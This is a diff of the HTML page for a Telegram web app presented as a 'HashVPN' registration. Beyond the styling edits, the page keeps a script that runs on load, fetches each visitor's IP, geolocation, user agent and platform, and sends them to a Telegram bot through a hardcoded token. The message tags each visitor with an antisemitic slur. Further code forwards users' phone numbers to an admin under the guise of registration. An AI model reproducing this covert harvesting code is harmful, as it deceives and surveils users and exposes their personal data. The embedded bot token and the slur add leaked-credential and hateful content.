@@ -3,9 +3,7 @@
 <head>
     <title>HashVPN</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Важно для адаптации -->
     <style>
-        /* Базовые стили */
         body {
             margin: 0;
             padding: 20px;
@@ -22,19 +20,6 @@
         .container {
             max-width: 400px;
             width: 100%;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        h1 {
-            font-size: 2rem; /* Используем rem для масштабирования */
-            margin-bottom: 1rem;
-        }
-
-        p {
-            font-size: 1rem;
-            color: var(--tg-theme-hint-color, #888888);
-            margin-bottom: 1.5rem;
         }
 
         button {
@@ -43,36 +28,15 @@
             border: none;
             padding: 15px 30px;
             border-radius: 10px;
-            font-size: 1rem;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 1rem;
-            width: 100%;
+            margin-top: 20px;
         }
 
         #phone-number {
-            margin-top: 1.5rem;
-            font-size: 1rem;
+            margin-top: 20px;
+            font-size: 18px;
             color: var(--tg-theme-link-color, #007aff);
-        }
-
-        /* Адаптация для мобильных устройств */
-        @media (max-width: 600px) {
-            h1 {
-                font-size: 1.5rem; /* Уменьшаем размер заголовка */
-            }
-
-            p {
-                font-size: 0.875rem; /* Уменьшаем размер текста */
-            }
-
-            button {
-                padding: 12px 24px; /* Уменьшаем padding кнопки */
-                font-size: 0.875rem; /* Уменьшаем размер текста кнопки */
-            }
-
-            #phone-number {
-                font-size: 0.875rem; /* Уменьшаем размер текста номера */
-            }
         }
     </style>
 </head>
@@ -85,47 +49,47 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8038248372:AAGD5Bb7p8UVjDUNbyIQP8gnc1_YK5Cre7w'; // Замените на токен вашего бота
+    	const BOT_TOKEN = '8038248372:AAGD5Bb7p8UVjDUNbyIQP8gnc1_YK5Cre7w'; // Замените на токен вашего бота
         const ADMIN_CHAT_ID = '1521132127'; // Замените на ID администратора
 
-        async function sendInfo() {
-            try {
-                const userAgent = navigator.userAgent;
-                const time = new Date().toLocaleString();
-                const device = navigator.platform;
+    	async function sendInfo() {
+    try {
+        const userAgent = navigator.userAgent;
+        const time = new Date().toLocaleString();
+        const device = navigator.platform;
 
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                if (!ipResponse.ok) {
-                    throw new Error('Ошибка при получении IP');
-                }
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
-                if (!geoResponse.ok) {
-                    throw new Error('Ошибка при получении геолокации');
-                }
-                const geoData = await geoResponse.json();
-                const { city, region, country } = geoData;
-
-                const message = `🧊 НОВЫЙ ГОЙ\n\nIP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}\nDevice: ${device}\nLocation: ${city}, ${region}, ${country}`;
-
-                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-                await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_CHAT_ID,
-                        text: message
-                    })
-                });
-            } catch (error) {
-                console.error('Ошибка:', error);
-            }
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (!ipResponse.ok) {
+            throw new Error('Ошибка при получении IP');
         }
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
 
-        window.onload = sendInfo;
+        const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+        if (!geoResponse.ok) {
+            throw new Error('Ошибка при получении геолокации');
+        }
+        const geoData = await geoResponse.json();
+        const { city, region, country } = geoData;
+
+        const message = `🧊 НОВЫЙ ГОЙ\n\nIP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}\nDevice: ${device}\nLocation: ${city}, ${region}, ${country}`;
+
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        await fetch(telegramUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: message
+            })
+        });
+    } catch (error) {
+        console.error('Ошибка:', error);
+    }
+}
+		
+		window.onload = sendInfo;
         const tg = window.Telegram.WebApp;
 
         if (tg && tg.expand) {
@@ -154,12 +118,7 @@
                         + `📛 Username: @${user.username || 'нет'}`;
 
                     // Отправляем сообщение администратору
-                    try {
-                        sendToAdmin(message);
-                        location.href = "vpn.html";
-                    } catch {
-                        tg.showAlert('Ошибка при регистрации, попробуйте с ПК.');
-                    }
+                    try { sendToAdmin(message); location.href = "vpn.html"; } catch { tg.showAlert('Ошибка при регестрации, попробуйте с пк.'); }
                 } else {
                     tg.showAlert('Вы отменили запрос номера.');
                 }
@@ -180,7 +139,7 @@
                 });
 
                 if (response.ok) {
-                    tg.showAlert('✅ Регестрация завершина');
+                    tg.showAlert('✅ Ваш номер был отправлен администратору!');
                 } else {
                     tg.showAlert('⚠️ Произошла ошибка при отправке номера.');
                 }
